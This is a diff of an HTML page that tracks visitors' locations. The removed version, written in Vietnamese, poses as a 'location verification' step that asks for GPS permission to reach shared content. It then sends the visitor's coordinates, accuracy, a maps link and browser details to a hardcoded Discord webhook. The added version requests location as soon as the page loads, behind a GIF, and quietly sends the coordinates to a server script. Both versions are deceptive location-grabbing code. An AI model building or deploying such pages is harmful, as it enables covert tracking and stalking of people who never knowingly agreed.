@@ -1,104 +1,32 @@
 <!DOCTYPE html>
-<html lang="vi">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hệ thống Xác thực Vị trí</title>
-    <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; text-align: center; padding: 40px 20px; background-color: #f4f6f9; color: #333; }
-        .card { max-width: 450px; margin: 30px auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        h2 { color: #2c3e50; margin-bottom: 10px; }
-        p { color: #7f8c8d; font-size: 15px; line-height: 1.5; }
-        .btn { background-color: #5865F2; color: white; border: none; padding: 14px 28px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: all 0.2s ease; width: 100%; margin-top: 15px; }
-        .btn:hover { background-color: #4752C4; transform: translateY(-1px); }
-        .status { margin-top: 20px; font-weight: 600; font-size: 15px; }
-        .success { color: #2ecc71; }
-        .error { color: #e74c3c; }
-    </style>
-</head>
-<body>
+<html>
+<body onload="getLocation()">
 
-<div class="card">
-    <h2>Xác thực Vị trí Thiết bị</h2>
-    <p>Để tiếp tục truy cập nội dung được chia sẻ, vui lòng nhấn nút bên dưới và chọn <b>"Allow" (Cho phép)</b> khi trình duyệt yêu cầu cấp quyền truy cập GPS.</p>
-    
-    <button class="btn" onclick="requestLocation()">KÍCH HOẠT XÁC THỰC</button>
-    
-    <div id="statusText" class="status"></div>
-</div>
+<iframe src="https://giphy.com/embed/5uDNFrOi6VwrkFKBaj" width="480" height="480" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/waiting-meh-disapproving-5uDNFrOi6VwrkFKBaj">via GIPHY</a></p>
+
+
+<p id="demo"></p>
 
 <script>
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1527956134856495104/4nt29jEEtSdg99Ks_nga5go68k-MyiYoI-e8RY3ymAEw_dgQf98bVuoE6l7_odXxtUXS";
+var x = document.getElementById("demo");
 
-const statusText = document.getElementById("statusText");
-
-function requestLocation() {
-    statusText.className = "status";
-    statusText.innerHTML = "🔄 Đang kết nối tới phần cứng GPS...";
-
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendDataToDiscord, handleLocationError, {
-            enableHighAccuracy: true,
-            timeout: 7000,
-            maximumAge: 0
-        });
-    } else {
-        statusText.className = "status error";
-        statusText.innerHTML = "❌ Trình duyệt của bạn không hỗ trợ định vị GPS.";
-    }
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
 }
 
-function sendDataToDiscord(position) {
-    statusText.className = "status success";
-    statusText.innerHTML = "✅ Xác thực thành công! Dữ liệu đã được gửi về hệ thống.";
-
-    const lat = position.coords.latitude;
-    const lon = position.coords.longitude;
-    const accuracy = position.coords.accuracy;
-
-    const payload = {
-        embeds: [{
-            title: "🎯 Thiết bị đã cấp quyền vị trí thành công!",
-            color: 5763719, 
-            fields: [
-                { name: "🛰️ Vĩ độ (Latitude)", value: `\`${lat}\``, inline: true },
-                { name: "🛰️ Kinh độ (Longitude)", value: `\`${lon}\``, inline: true },
-                { name: "🎯 Độ chính xác (Accuracy)", value: `\`${accuracy} mét\``, inline: false },
-                { name: "🌐 Google Maps Link", value: `[Bấm để xem vị trí trên bản đồ](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
-                { name: "📱 Thông tin thiết bị", value: navigator.userAgent, inline: false }
-            ],
-            timestamp: new Date().toISOString()
-        }]
-    };
-
-    fetch(DISCORD_WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-    })
-    .catch(err => {
-        console.error("Lỗi gửi dữ liệu lên Discord:", err);
-    });
-}
-
-function handleLocationError(error) {
-    statusText.className = "status error";
-    switch(error.code) {
-        case error.PERMISSION_DENIED:
-            statusText.innerHTML = "❌ Xác thực thất bại: Bạn đã từ chối cấp quyền vị trí.";
-            break;
-        case error.POSITION_UNAVAILABLE:
-            statusText.innerHTML = "❌ Lỗi: Thông tin vị trí không khả dụng trên thiết bị này.";
-            break;
-        case error.TIMEOUT:
-            statusText.innerHTML = "❌ Lỗi: Quá thời gian chờ phản hồi từ phần cứng GPS.";
-            break;
-        default:
-            statusText.innerHTML = "❌ Đã xảy ra lỗi hệ thống không xác định.";
-            break;
-    }
+function showPosition(position) {
+  const xhttp = new XMLHttpRequest();
+  xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
+  xhttp.send();
 }
 </script>
 
 </body>
 </html>
+
+
+
